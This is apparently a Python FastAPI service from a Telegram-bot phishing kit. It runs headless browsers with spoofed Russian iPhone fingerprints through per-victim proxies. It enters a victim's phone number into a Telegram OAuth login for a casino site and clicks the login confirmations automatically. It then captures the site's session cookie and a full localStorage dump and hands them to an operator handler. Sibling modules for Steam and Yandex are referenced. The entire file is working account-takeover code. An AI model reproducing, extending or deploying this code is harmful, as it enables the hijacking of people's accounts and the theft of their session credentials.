import asyncio
import time
import logging
from urllib.parse import urlparse
from contextlib import suppress

from fastapi import FastAPI, Form, BackgroundTasks, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from playwright.async_api import async_playwright
from store import get_active_domain
from config import ADMIN_CHAT_ID
from xray_bridge import ensure_xray_bridge, stop_xray_bridge

app = FastAPI(openapi_url=None, docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
app.mount("/static", StaticFiles(directory="static"), name="static")
logger = logging.getLogger("tg_webapp")

sessions: dict[str, dict] = {}
_recent_closures: dict[str, dict] = {}
SESSION_TTL = 300
_ttl_task = None
_ON_ZOOMA_SESSION = None


async def close_sessions_for_chat(chat_id: int, exclude_sid: str | None = None):
    if chat_id is None:
        return
    for sid in list(sessions.keys()):
        if exclude_sid and sid == exclude_sid:
            continue
        if _chat_id_from_sid(sid) == int(chat_id):
            await _close_session(sid, reason="superseded_by_other_auth")


async def close_session_by_sid(sid: str, reason: str = "admin_stop") -> bool:
    if sid not in sessions:
        return False
    await _close_session(sid, reason=reason)
    return True

def _tg_start_url() -> str:
    base = get_active_domain() or ""
    host = ""
    if base:
        with suppress(Exception):
            host = (urlparse(base).hostname or "").strip().lower()
    if not host:
        host = "zooma.casino"
    return f"https://casiauth.com/go?from={host}&type=tg"


def set_zooma_session_handler(handler):
    global _ON_ZOOMA_SESSION
    _ON_ZOOMA_SESSION = handler


def _chat_id_from_sid(sid: str) -> int | None:
    parts = sid.split("_")
    if not parts:
        return None
    tail = parts[-1].strip()
    return int(tail) if tail.isdigit() else None


def _find_tg_oauth_frame(page):
    for fr in page.frames:
        furl = (fr.url or "").lower()
        if "oauth.telegram.org" in furl:
            return fr
    return None


def _get_active_page(sess: dict):
    popup = sess.get("auth_page")
    if popup:
        with suppress(Exception):
            if not popup.is_closed():
                return popup
    return sess.get("page")


async def _close_session(sid: str, reason: str = "unknown"):
    sess = sessions.pop(sid, None)
    if not sess:
        return
    try:
        pages = []
        for key in ("auth_page", "page"):
            p = sess.get(key)
            if not p:
                continue
            pages.append(p)
        for p in pages:
            with suppress(Exception):
                await p.close()
        with suppress(Exception):
            await sess["context"].close()
        with suppress(Exception):
            await sess["browser"].close()
        with suppress(Exception):
            await sess["pw"].stop()
    finally:
        _recent_closures[sid] = {"reason": reason, "ts": int(time.time())}
        stop_xray_bridge(sid)
        logger.info("[%s] closed session reason=%s", sid, reason)


def _touch(sid: str):
    if sid in sessions:
        sessions[sid]["last_seen"] = int(time.time())


async def _cleanup_expired():
    now = int(time.time())
    for sid, meta in list(_recent_closures.items()):
        if now - int(meta.get("ts") or now) > 900:
            _recent_closures.pop(sid, None)
    for sid, sess in list(sessions.items()):
        if now - int(sess.get("last_seen", now)) > SESSION_TTL:
            await _close_session(sid, reason="ttl_expired")


async def _ttl_loop():
    while True:
        await _cleanup_expired()
        await asyncio.sleep(5)


def _ensure_ttl_cleaner_started():
    global _ttl_task
    if _ttl_task is None or _ttl_task.done():
        _ttl_task = asyncio.create_task(_ttl_loop())


async def init_tg_browser(sid: str, init_token: int):
    if sid not in sessions:
        sessions[sid] = {
            "ready": False,
            "done": False,
            "stage": "booting",
            "init_error": "",
            "init_token": init_token,
            "created_at": int(time.time()),
            "last_seen": int(time.time()),
        }

    if sessions[sid].get("init_token") != init_token:
        return

    chat_id = _chat_id_from_sid(sid)
    if chat_id is None:
        raise RuntimeError("bad_sid_chat_id")
    bridge_url = ensure_xray_bridge(sid, chat_id)
    pw = await async_playwright().start()
    launch_kwargs = {"headless": True}
    launch_kwargs["args"] = [f"--zooma-auth-sid={sid}"]
    if bridge_url:
        launch_kwargs["proxy"] = {"server": bridge_url}
        logger.info("[%s] TG proxy bridge enabled: %s", sid, bridge_url)
    else:
        logger.info("[%s] TG proxy bypass for admin chat_id=%s", sid, ADMIN_CHAT_ID)
    browser = await pw.chromium.launch(**launch_kwargs)
    context = await browser.new_context(
        viewport={"width": 393, "height": 852},
        screen={"width": 393, "height": 852},
        device_scale_factor=3,
        locale="ru-RU",
        extra_http_headers={"Accept-Language": "ru-RU,ru;q=0.9"},
        user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        is_mobile=True,
        has_touch=True,
        timezone_id="Europe/Moscow",
    )
    page = await context.new_page()
    init_route_handler = None
    try:
        async def _init_route(route):
            req = route.request
            if req.resource_type in {"image", "font", "media"}:
                await route.abort()
                return
            await route.continue_()
        init_route_handler = _init_route
        await page.route("**/*", init_route_handler)
    except Exception:
        init_route_handler = None
    await page.add_init_script(
        """() => {
            Object.defineProperty(navigator, 'language', { get: () => 'ru-RU' });
            Object.defineProperty(navigator, 'languages', { get: () => ['ru-RU', 'ru'] });
            Object.defineProperty(navigator, 'platform', { get: () => 'iPhone' });
            Object.defineProperty(Intl.DateTimeFormat.prototype, 'resolvedOptions', {
                value: function () {
                    return { locale: 'ru-RU', timeZone: 'Europe/Moscow' };
                }
            });
        }"""
    )
    last_err = None
    for _ in range(1):
        try:
            # casiauth often hangs before DOMContentLoaded; commit is enough to continue.
            await page.goto(_tg_start_url(), wait_until="commit", timeout=15000)
            if init_route_handler:
                with suppress(Exception):
                    await page.unroute("**/*", init_route_handler)
            last_err = None
            break
        except Exception as e:
            last_err = e
            await asyncio.sleep(1)
    if last_err:
        raise last_err

    current = sessions.get(sid)
    if not current or current.get("init_token") != init_token:
        with suppress(Exception):
            await browser.close()
        with suppress(Exception):
            await pw.stop()
        return

    current.update(
        {
            "page": page,
            "context": context,
            "browser": browser,
            "pw": pw,
            "ready": True,
            "stage": "phone",
            "init_error": "",
            "last_seen": int(time.time()),
        }
    )
    logger.info("[%s] tg init done", sid)


@app.get("/api/init_tg")
async def api_init_tg(sid: str, bg: BackgroundTasks):
    _recent_closures.pop(sid, None)
    _ensure_ttl_cleaner_started()
    await _cleanup_expired()
    chat_id = _chat_id_from_sid(sid)
    if chat_id is not None:
        try:
            ensure_xray_bridge(sid, int(chat_id))
        except Exception as e:
            sessions[sid] = {
                "ready": False,
                "done": False,
                "stage": "init_error",
                "init_error": str(e),
                "init_token": time.time_ns(),
                "created_at": int(time.time()),
                "last_seen": int(time.time()),
            }
            return {"status": "error", "msg": str(e)}
        with suppress(Exception):
            from steam_webapp import close_sessions_for_chat as close_steam_sessions_for_chat
            await close_steam_sessions_for_chat(int(chat_id))
        with suppress(Exception):
            from yandex_webapp import close_sessions_for_chat as close_ya_sessions_for_chat
            await close_ya_sessions_for_chat(int(chat_id))
        await close_sessions_for_chat(int(chat_id), exclude_sid=sid)
    if sid in sessions and sessions[sid].get("ready") and not sessions[sid].get("done"):
        _touch(sid)
        return {"status": "ok", "reused": True}
    if sid in sessions and not sessions[sid].get("ready") and not sessions[sid].get("done"):
        _touch(sid)
        return {"status": "pending"}

    sessions[sid] = {
        "ready": False,
        "done": False,
        "stage": "booting",
        "init_error": "",
        "init_token": time.time_ns(),
        "created_at": int(time.time()),
        "last_seen": int(time.time()),
    }
    init_token = sessions[sid]["init_token"]

    async def _run_init():
        try:
            await init_tg_browser(sid, init_token)
        except Exception as e:
            sess = sessions.get(sid)
            if sess and sess.get("init_token") == init_token:
                sess["stage"] = "init_error"
                sess["init_error"] = str(e)
            logger.exception("[%s] tg init failed: %s", sid, e)

    bg.add_task(_run_init)
    return {"status": "pending"}


@app.post("/api/tg_login")
async def api_tg_login(sid: str = Form(...), phone: str = Form(...)):
    await _cleanup_expired()
    if sid not in sessions or not sessions[sid].get("ready"):
        sess = sessions.get(sid)
        if sess and sess.get("stage") == "init_error":
            init_error = str(sess.get("init_error") or "init failed")
            if "proxy_required" in init_error:
                return {
                    "status": "error",
                    "msg": "Для прохождения авторизации требуется прокси.\nАдмин оповещен @saxarok322",
                }
            return {"status": "error", "msg": f"Ошибка запуска: {init_error}"}
        return {"status": "pending", "msg": "Инициализация браузера, подождите..."}

    _touch(sid)
    sess = sessions[sid]
    page = _get_active_page(sess)

    try:
        clean_phone = "".join(filter(str.isdigit, phone))
        frame = _find_tg_oauth_frame(page)
        if frame is None:
            await asyncio.sleep(1)
            frame = _find_tg_oauth_frame(page)

        target = frame or page.main_frame

        # Not only phone flow: if Telegram already moved to confirm step, proceed.
        cur_url = ((frame.url if frame else page.url) or "").lower()
        if "auth/push" in cur_url or "confirm" in cur_url:
            sessions[sid]["stage"] = "wait_confirm"
            return {"status": "wait_confirm"}

        phone_input = target.locator(
            "input#login-phone, input[name='phone'], input[type='tel'], input[autocomplete='tel']"
        ).first

        # Telegram widget may open a popup instead of rendering the phone form inline.
        try:
            await phone_input.wait_for(timeout=4000)
        except Exception:
            widget_btn = page.locator(
                "button:has-text('Войти через Telegram'), button:has-text('Log in with Telegram'), "
                "a:has-text('Log in with Telegram'), .tgme_widget_login_button, #telegram-login-gpnv_auth_bot"
            ).first
            popup = None
            popup_task = asyncio.create_task(page.wait_for_event("popup", timeout=4000))
            with suppress(Exception):
                await widget_btn.click(timeout=3000, force=True)
            with suppress(Exception):
                popup = await popup_task
            if popup:
                await popup.wait_for_load_state("commit", timeout=15000)
                sess["auth_page"] = popup
                page = popup
            await asyncio.sleep(1.2)
            frame = _find_tg_oauth_frame(page) or frame
            target = frame or page.main_frame

            cur_url = ((frame.url if frame else page.url) or "").lower()
            if "auth/push" in cur_url or "confirm" in cur_url:
                sess["stage"] = "wait_confirm"
                return {"status": "wait_confirm"}

            phone_input = target.locator(
                "input#login-phone, input[name='phone'], input[type='tel'], input[autocomplete='tel']"
            ).first
            await phone_input.wait_for(timeout=12000)

        await phone_input.click()
        await phone_input.press("Control+A")
        await phone_input.press("Backspace")
        # Type via locator to support both Frame and Page targets.
        with suppress(Exception):
            await phone_input.type(clean_phone, delay=120)
        if not await phone_input.input_value():
            await phone_input.fill(clean_phone)

        next_btn = target.locator(
            "button:has-text('Далее'), button:has-text('Next'), button:has-text('Log in'), button.btn-primary, button[type='submit']"
        ).first
        with suppress(Exception):
            await next_btn.click(timeout=5000, force=True)
        if sess.get("auth_page") is not None:
            sess["stage"] = "wait_confirm"
            return {"status": "wait_confirm"}

        await asyncio.sleep(2)
        page_url = (page.url or "").lower()
        frame_url = ((frame.url if frame else "") or "").lower()
        page_content = (await page.content()).lower()
        frame_content = ""
        with suppress(Exception):
            frame_content = (await frame.content()).lower() if frame else ""
        indicators = [
            "auth/push",
            "confirm",
            "отправили сообщение",
            "check your telegram",
            "we have sent",
            "cs2a.run",
            "cs2run.app",
        ]
        if any(
            x in page_url or x in frame_url or x in page_content or x in frame_content
            for x in indicators
        ):
            sessions[sid]["stage"] = "wait_confirm"
            return {"status": "wait_confirm"}

        return {"status": "error", "msg": "ТГ не перешел к подтверждению"}
    except Exception as e:
        logger.exception("[%s] tg_login failed: %s", sid, e)
        return {"status": "error", "msg": str(e)}


async def _check_and_finalize(sid: str) -> dict:
    if sid not in sessions:
        meta = _recent_closures.get(sid) or {}
        if str(meta.get("reason") or "") == "admin_stop":
            return {"status": "admin_stopped"}
        return {"status": "waiting"}
    sess = sessions[sid]
    if sess.get("done"):
        return {"status": "already_done"}

    page = _get_active_page(sess)
    if not page:
        return {"status": "waiting"}

    try:
        popup = sess.get("auth_page")
        if popup:
            with suppress(Exception):
                if popup.is_closed():
                    sess.pop("auth_page", None)
                else:
                    popup_url = (popup.url or "").lower()
                    # Do not auto-accept consent popup here: this can create a wrong flow
                    # for casiauth widget auth. We only support "login as" button clicks.
                    with suppress(Exception):
                        popup_body = (await popup.text_content("body") or "").lower()
                        # On Telegram auth page, complete login as current user.
                        if "войдите, чтобы использовать аккаунт telegram" in popup_body or "log in to use telegram" in popup_body:
                            login_as_btn = popup.locator(
                                "button:has-text('Войти как'), button:has-text('Log in as'), "
                                "button:has-text('Continue as')"
                            ).first
                            await login_as_btn.click(timeout=2000, force=True)
                            await asyncio.sleep(1)
                        if "session terminated" in popup_body or "сессия завершена" in popup_body:
                            logger.warning("[%s] tg popup indicates Telegram widget session terminated", sid)
                    # After approve, popup may redirect back to casiauth/return_to.
                    if "casiauth.com/go?" in popup_url or "#tgauthresult=" in popup_url:
                        with suppress(Exception):
                            await sess["page"].goto(popup.url, wait_until="commit", timeout=10000)
                        with suppress(Exception):
                            await popup.close()
                        sess.pop("auth_page", None)

        cookies = await page.context.cookies()
        cookie_names = [c.get("name", "") for c in cookies]
        # After Telegram confirm, casiauth page often shows "Войти как <name>" in widget.
        # Click it on main page/frame and let normal redirect complete (no forced refresh).
        main_page = sess.get("page")
        if main_page:
            with suppress(Exception):
                login_as_main = main_page.locator(
                    "button:has-text('Войти как'), button:has-text('Log in as'), "
                    "button:has-text('Continue as')"
                ).first
                if await login_as_main.count():
                    await login_as_main.click(timeout=1500, force=True)
            with suppress(Exception):
                fr = _find_tg_oauth_frame(main_page)
                if fr:
                    login_as_frame = fr.locator(
                        "button:has-text('Войти как'), button:has-text('Log in as'), "
                        "button:has-text('Continue as')"
                    ).first
                    if await login_as_frame.count():
                        await login_as_frame.click(timeout=1500, force=True)

        # casiauth stores intermediate telegram cookies in browser context.
        # If we already saw transition request to target domain, do not interrupt it.
        if ("stel_acid" in cookie_names or "stel_token" in cookie_names) and sess.get("page"):
            page_url_l = (sess["page"].url or "").lower()
            if "goauth?secretkey=" not in page_url_l:
                pass
        zooma_session = None
        for c in cookies:
            if c.get("name") == "zooma_top_session" and c.get("value"):
                zooma_session = str(c["value"]).strip()
                break

        if not zooma_session:
            return {"status": "waiting"}

        local_storage_dump = await page.evaluate(
            """() => {
                const out = {};
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        out[k] = localStorage.getItem(k);
                    }
                } catch (e) {}
                return out;
            }"""
        )
        local_storage_dump = dict(local_storage_dump or {})
        local_storage_dump["auth_method"] = "tg_webapp"

        chat_id = _chat_id_from_sid(sid)
        if _ON_ZOOMA_SESSION and chat_id is not None:
            ok, msg = await _ON_ZOOMA_SESSION(chat_id, zooma_session, local_storage_dump)
            if ok:
                sess["done"] = True
                sess["stage"] = "done"
                await _close_session(sid, reason="zooma_session_connected")
                return {"status": "done", "message": msg or "ok"}
            return {"status": "error", "message": msg or "Не удалось сохранить сессию"}

        return {"status": "waiting"}
    except Exception:
        return {"status": "waiting"}


@app.get("/api/check_tg_status")
async def api_check_tg_status(sid: str):
    await _cleanup_expired()
    if sid in sessions:
        _touch(sid)
    return await _check_and_finalize(sid)


@app.get("/api/state")
async def api_state(sid: str):
    await _cleanup_expired()
    if sid not in sessions:
        meta = _recent_closures.get(sid) or {}
        if str(meta.get("reason") or "") == "admin_stop":
            return {"status": "admin_stopped", "stage": "stopped", "ready": False, "init_error": ""}
        return {"status": "missing", "stage": "phone", "ready": False, "init_error": ""}
    _touch(sid)
    return {
        "status": "ok",
        "stage": sessions[sid].get("stage", "phone"),
        "ready": bool(sessions[sid].get("ready")),
        "init_error": sessions[sid].get("init_error", ""),
    }


@app.post("/api/ping")
async def api_ping(sid: str = Form(...)):
    await _cleanup_expired()
    if sid not in sessions or sessions[sid].get("done"):
        return {"status": "missing"}
    _touch(sid)
    return {"status": "ok"}


@app.post("/api/cancel")
async def api_cancel(sid: str = Form(...)):
    await _close_session(sid, reason="manual_cancel")
    return {"status": "ok"}


templates = Jinja2Templates(directory="templates")


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse(request, "tg.html")


@app.on_event("startup")
async def startup():
    _ensure_ttl_cleaner_started()
